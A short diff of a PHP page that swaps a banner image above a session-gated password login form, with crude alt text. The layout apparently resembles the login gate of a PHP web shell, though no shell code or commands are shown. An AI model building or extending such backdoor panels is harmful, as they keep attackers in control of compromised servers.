@@ -21,7 +21,7 @@ if (!$_SESSION['loggedIn']): ?>
     <center>
     <p align="center"><center><font style="font-size:13px" color="red" face="text-dark">
     <form method="post">
-      <img src="https://img.inews.co.id/media/822/files/inews_new/2018/06/11/polres_jaksel.jpg" alt="Fuck Image" style="width:1000px;height:1000px;"><br><br>
+      <img src="https://i.ibb.co/y7Yc3wx/banner4.jpg" alt="Fuck Image" style="width:1000px;height:1000px;"><br><br>
       <input type="password" name="password">
       <input type="submit" name="submit" value="  Login"><br>
     </form>
